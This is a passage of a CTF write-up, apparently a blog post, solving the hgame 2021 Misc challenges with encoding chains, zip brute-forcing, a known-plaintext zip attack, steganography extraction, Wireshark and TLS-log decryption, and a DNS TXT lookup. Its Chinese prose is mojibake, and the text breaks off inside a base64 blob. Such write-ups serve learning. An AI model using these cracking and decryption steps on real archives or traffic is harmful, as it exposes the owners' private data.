ERROR</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Baseå…¨å®¶ç¦"><a href="#Baseå…¨å®¶ç¦" class="headerlink" title="Baseå…¨å®¶ç¦"></a>Baseå…¨å®¶ç¦</h3><p>base ç¼–ç å¥—å¨ƒï¼Œé€šè¿‡ <code>base64 --&gt; base32 --&gt; From Hex</code> è§£ç å³å¯ä»¥å¾—å‡º flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397287897688/c9f7249614a482f5f80ac758582ed09d4cf60d3a.png"></p><h3 id="ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•"><a href="#ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•" class="headerlink" title="ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•"></a>ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•</h3><p>010 editor æ‰“å¼€å›¾ç‰‡å‘ç°æ–‡ä»¶å°¾éƒ¨æœ‰å‹ç¼©æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288170728/8d1b95abab4fa5e5e171d03a37c8c7dc52733800.png"></p><p>åˆ†ç¦»å‡ºæ¥åå‹ç¼©åŒ…çš„å¤‡æ³¨å¤„æœ‰å¦‚ä¸‹æç¤ºã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Password is picture ID (Up to 8 digits)</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºä½¿ç”¨ ARCHPR çˆ†ç ´å¾—åˆ°å‹ç¼©åŒ…å¯†ç ä¸º 70415155ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288474325/cef270df89e9fe21b6e8d685e8f4c829b0be0424.png"></p><p>è§£å‹ä¹‹ååœ¨ NO PASSWORD æ–‡æœ¬æ–‡æ¡£ä¸­å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sometimes we don&#39;t need to care about password.</span><br><span class="line">Because it&#39;s too strong or null. XD</span><br><span class="line">By the way, I only use storage.</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸¤ä¸ªå‹ç¼©åŒ…ä¸­çš„ NO PASSWORD çš„ CRCï¼Œå‘ç°æ˜¯ä¸€æ ·çš„ã€‚äºæ˜¯å•ç‹¬å‹ç¼©ä¸€ä»½ NO PASSWORD ç„¶åå¯¹è§£å‹å‡ºæ¥çš„ plain.zip è¿›è¡Œæ˜æ–‡æ”»å‡»ï¼Œå¯ä»¥å¾—å‡ºå¯†ç ä¸º <code>C8uvP$DP</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397288843522/154d75431f8302befbc81ff4829f7284b9e2c24a.png"></p><p>è§£å‹ plain.zip å¾—åˆ° flag.zipã€‚ä½¿ç”¨ 010 editor æ‰“å¼€æ–‡ä»¶å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D;</span><br></pre></td></tr></table></figure><p>å°†å…¶ HTML Entity è§£ç å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;2IP_is_Usefu1_and_Me9umi_i5_W0r1d&#125;</span><br></pre></td></tr></table></figure><h3 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h3><p>Wireshark åˆ†ææµé‡åŒ…ï¼Œç­›é€‰ http æ¡ç›®ï¼Œè·Ÿè¸ª HTTP æµåˆ° TCP æµ 26 å¯è§å›¾ç‰‡æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397289103836/51f782600e5994cc2d0f9b797db627dc4fa1af1b.png"></p><p>å°†å›¾ç‰‡æå–å‡ºæ¥ä½¿ç”¨ 010 editor æ‰“å¼€ï¼Œæ¨¡æ¿è¿è¡Œæœ‰ CRC Mismatch æŠ¥é”™ï¼Œäºæ˜¯ç”¨è„šæœ¬çˆ†ç ´å¾—å›¾ç‰‡å®½é«˜ <code>hex: 0x1440 0x1000</code>ã€‚å°†å›¾ç‰‡å®½é«˜ä¿®æ­£å¯å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397289611138/c9121599247804ee6de2f77321405b1b44827e15.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Wh4t_A_W0nderfu1_Wa11paper&#125;</span><br></pre></td></tr></table></figure><h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>è§£å‹å¾—åˆ°ä¸¤ä¸ª Word æ–‡æ¡£ï¼Œå°† first.docx è§£å‹ï¼Œå¯ä»¥ä» password.xml ä¸­æ‰¾åˆ°ä¸€æ®µ BrainFuck å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;</span><br></pre></td></tr></table></figure><p>å¯è§£å¾— maimai.docx çš„å¯†ç  <code>DOYOUKNOWHIDDEN?</code>ã€‚æ‰“å¼€ maimai.docx åæ˜¾ç¤ºéšè—å­—ç¬¦å¯å¾—ä¸€ä¸²åˆ¶è¡¨ç¬¦å’Œç©ºæ ¼é”™è½çš„å†…å®¹ã€‚å¹¶ä¸”å›¾ç‰‡æš—ç¤º<code>é›ª</code>ï¼Œå› æ­¤è€ƒè™‘ snow éšå†™ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290090528/e2f2c51101eb34efd17d2b3b440695b4cba5cff6.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                              </span><br><span class="line">                                 </span><br><span class="line">                             </span><br><span class="line">                                    </span><br><span class="line">                                   </span><br><span class="line">                                         </span><br><span class="line">                                </span><br><span class="line">                                       </span><br><span class="line">                                          </span><br><span class="line">                        </span><br><span class="line">                        </span><br></pre></td></tr></table></figure><p>å°†ä»¥ä¸Šå­—ç¬¦ä¿å­˜ä¸º html æ–‡ä»¶å¹¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸­è·å–é“¾æ¥ï¼Œåˆ©ç”¨<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">åœ¨çº¿åŠ è§£å¯†å·¥å…·</a>è§£å¯†å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX&#125;</span><br></pre></td></tr></table></figure><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><p>åœ¨ Matryoshka.jpg çš„æ–‡ä»¶å¤‡æ³¨ä¸­å‘ç°äº† <code>!LyJJ9bi&amp;M7E72*JyD</code>ï¼Œæ ¹æ® F5 çš„æš—ç¤ºçŒœæµ‹å…¶ä¸º F5 éšå†™ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290281286/29981c9d09e186d7d9ae09b75fb8f6487f330acc.png"></p><p>ä½¿ç”¨ F5 éšå†™å·¥å…·æå–å‡ºå†…å®¹å¯å¾— <code>e@317S*p1A4bIYIs1M</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290528230/731ea50868a7a847acf6e194cbddb39e0ca0cb55.png" alt="image-20210207123441141"></p><p>å°† <code>e@317S*p1A4bIYIs1M</code> ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹å¯å¾— 01.jpgã€‚æ ¹æ®æš—ç¤ºå¯çŸ¥å…¶ç»è¿‡äº† steghide éšå†™ã€‚åœ¨ 01.jpg çš„æ–‡ä»¶å¤‡æ³¨ä¸­å‘ç°äº† <code>A7SL9nHRJXLh@$EbE8</code>ï¼Œå°†å…¶ä½œä¸ºå¯†ç æ‰§è¡Œ steghide extract ä¹‹åå¾—åˆ°äº† pwd.txtã€‚å…¶ä¸­åŒ…å«äº† <code>u0!FO4JUhl5!L55%$&amp;</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397290765999/712d328b969859426c837dec205e702f467e9517.png"></p><p>å°†å…¶ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹ Steghide.7zï¼Œå¾—åˆ° Outguess.7z å’Œ 02.jpgã€‚åœ¨å›¾ç‰‡çš„å¤‡æ³¨ä¿¡æ¯ä¸­å¯å¾— <code>z0GFieYAee%gdf0%lF</code>ã€‚å°†å…¶ä½œä¸ºå¯†ç æ‰§è¡Œ outguess å¯å¾— <code>@UjXL93044V5zl2ZKI</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291060987/7db9c6685f0d53c12e15af7bce329a0edd205a9d.png"></p><p>å°†å…¶ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹ Outguess.7z å¯å¾— 03.jpg å’Œ JPHS.7zã€‚å›¾ç‰‡æ–‡ä»¶çš„å¤‡æ³¨ä¸­å¯å¾— <code>rFQmRoT5lze@4X4^@0</code>ã€‚å°†å…¶ä½œä¸ºå¯†ç æ‰§è¡Œ JPHS å¯è§£å¾— <code>xSRejK1^Z1Cp9M!z@H</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291463382/36ecab86fd98c24d729c10e3be95c426648ff0fe.png"></p><p>å°†å…¶ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹ JPHS.7z å¯å¾— 4.jpgã€‚è‡³æ­¤å››ç‰‡äºŒç»´ç åˆ‡ç‰‡é›†é½ã€‚ç”¨ Snipaste ç®€å•æ‹¼ä¸€ä¸‹å›¾å¾—åˆ°ä¸€ä¸ªäºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291707926/5ff886d610de5ccf011304a7f6c76618711ef793.png"></p><p>æ‰«æäºŒç»´ç å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Taowa_is_N0T_g00d_but_T001s_is_Useful&#125;</span><br></pre></td></tr></table></figure><h3 id="Telegraphï¼š1601-6639-3459-3134-0892"><a href="#Telegraphï¼š1601-6639-3459-3134-0892" class="headerlink" title="Telegraphï¼š1601 6639 3459 3134 0892"></a>Telegraphï¼š1601 6639 3459 3134 0892</h3><p>å°†é¢˜ç›®çš„ <code>1601 6639 3459 3134 0892</code> ä½¿ç”¨ä¸­æ–‡ç”µç è§£ç å¯å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397291901884/c6bab1a317354791cb68dbc2278a19793a58555f.png"></p><p>ä½¿ç”¨ Audition æ‰“å¼€éŸ³é¢‘æ–‡ä»¶ï¼Œå¯è§å¦‚ä¸‹æç¤ºã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292249542/eeac6bdb8d0fb67cad56b57bf50c85deb687d345.png"></p><p>å°† 850Hz å¤„çš„å†…å®¹æå–å‡ºæ¥ï¼Œå…¶ä¸­ä¸€æ®µå¯è§æ˜æ˜¾çš„æ‘©æ–¯ç”µç ã€‚å°†å…¶æˆªå–å¹¶æŠ„æ”¶ä¸‹æ¥ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292617887/a7920858a88af068a3df8ff8be75188506669e96.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ‘©æ–¯ç”µç è§£ç å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YOURFLAGIS:4G00DS0NGBUTN0T4G00DMAN039310KI</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;4G00DS0NGBUTN0T4G00DMAN039310KI&#125;</span><br></pre></td></tr></table></figure><h3 id="Hallucigenia"><a href="#Hallucigenia" class="headerlink" title="Hallucigenia"></a>Hallucigenia</h3><p>Stegsolve å¯è§£å‡ºå›¾ä¸­æœ‰ä¸€ä¸ªäºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292823942/8a5738b9adbc70c9dc141fbd4e986bf6ea243afb.png@200w.png"></p><p>æ‰«æä¹‹åå¯å¾—å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC&#x2F;KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51&#x2F;KHHT&#x2F;6&#x2F;ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5&#x2F;IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF&#x2F;LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y&#x2F;&#x2F;&#x2F;p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk&#x3D;</span><br></pre></td></tr></table></figure><p>å¾ˆå®¹æ˜“çœ‹å‡ºè¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œä½¿ç”¨ Cyberchef ç»è¿‡ <code>From Base64 --&gt; Reverse --&gt; Render Image --&gt; Rotate Image --&gt; Flip Image</code> ä¹‹åå¯ä»¥å¾—åˆ°å¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397292993797/3de98ca72000ada1b944261d195a8eb09df8ff1e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lemonprefect.cn&#x2F;cb&#x2F;#recipe&#x3D;From_Base64(&#39;A-Za-z0-9%2B&#x2F;%3D&#39;,true)Reverse(&#39;Character&#39;)Render_Image(&#39;Raw&#39;)Rotate_Image(180)Flip_Image(&#39;Horizontal&#39;)&amp;input&#x3D;Z21CQ3JrUk9SVWtBQUFBQStqcmdzV2FqYXEwQmVDM0lRaENFSVFoQ0tadzFNeFR6U2xOS25tSnBpdlc5SUhWUHJUanZra3VJM3NQN2JXQUVkSUhXQ2JEc0dzUmtaOUlVSkM5QWhmWkZicHFybVpCdEkrWnZwdFdDL0tDUHJMMGdGZVJQT2NJMld5cWpuZGZVV2xOaitkZ1dwZTFxU1RFY2R1clh6TVJBYzVFaWhzRWZsbUlOOFJ6dWd1V3E2MUpXUlFwU0k1MS9LSEhULzYvenRQWkozM1NTS2JpZVRhMUM1a29PTmJMY2Y5YVltc1ZoN1JXNnAzU3BBU25VU2IzSnVTdnBVQkt4c2NieUJqaU9wT1RxOGpjZFJzeDUvSW5kWHczVmdKVjZpTzErNmpsNGdqVnBXb3VWaU82aWg5Wm15YlNQa2hhcXlOVXhWWHBWNWNZVStYeDVzUVRmS3lzdERMaXBtcWFNaHhJY2d2cGxMcUYvTFdaeklTNVB2d2JxT3ZyU2xOSFZFWWNoQ0VJUUlTSUNTWkppand1NTByUlFIRHlVcGFGMHkvLy9wNkZFRENDREZzdVc3WUZvVkVGRVNUMEJBQUNMZ0xPckFBQUFBZ2dVQUFBQXRBQUFBRkpFU0VrTkFBQUFDaG9LRFVkT1VJaz0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;tenchi_souzou_dezain_bu&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag è½¬å†™æˆæ—¥æ–‡æ˜¯â€œå¤©åœ°å‰µé€ ãƒ‡ã‚¶ã‚¤ãƒ³éƒ¨â€ï¼Œè°·æ­Œç¿»è¯‘æˆä¸­æ–‡æ˜¯â€œå¤©å ‚è®¾è®¡éƒ¨â€ã€‚</p></blockquote><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>ä½¿ç”¨ Wireshark åˆ†ææµé‡åŒ…ï¼Œç­›é€‰ HTTP æ¡ç›®å¯çœ‹åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397293155011/989e138acd4b2fdd8db0dd70ebc3aa55d3f69f8e.png"></p><p>æ ¹æ®ä¿¡æ¯å¯çŸ¥ SPF æ˜¯ txt è®°å½•ï¼ŒåŒæ—¶åœ¨è¯·æ±‚ä¸­å¯ä»¥çœ‹åˆ°è¯·æ±‚åŸŸåæ˜¯ flag.hgame2021.cfã€‚ä½¿ç”¨ nslookup æŸ¥è¯¢è¿™ä¸ªåŸŸåçš„ txt è®°å½•å¯å¾— flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613397293546586/acdc82654c77ee6425baa219b4222a44d05865e6.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;D0main_N4me_5ystem&#125;</span><br></pre></td></tr></table></figure><h3 id="A-R-K"><a href="#A-R-K" class="headerlink" title="A R K"></a>A R K</h3><p>Wireshark åˆ†ææµé‡åŒ…ï¼Œè·Ÿè¸ª FTP æµé‡å¯å¾—åˆ°å¦‚ä¸‹ logã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399386464/dcb47fe07ceed6f6d6ea23971438f9865d6f5826.png"></p><p>å°† log å¯¼å…¥ Wireshark åè·Ÿè¸ª TLS æµã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/0da52ecf-d90f-4678-b4bf-a03fd2544eff/1613399410855/92e454ce47a9efd61de1f8e25156c0c769916628.png"></p><p>æ ¹æ®æç¤ºç€é‡è§‚å¯Ÿ HTTP è¯·æ±‚ <code>/quest/getBattleReplay</code>ï¼Œå°†å…¶å“åº”æ•°æ®å¯¼å‡ºå¹¶è§£ GZIP å¯å¾—å¦‚ä¸‹æ•°æ®ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;battleReplay&quot;</span>:<span class="string">&quot;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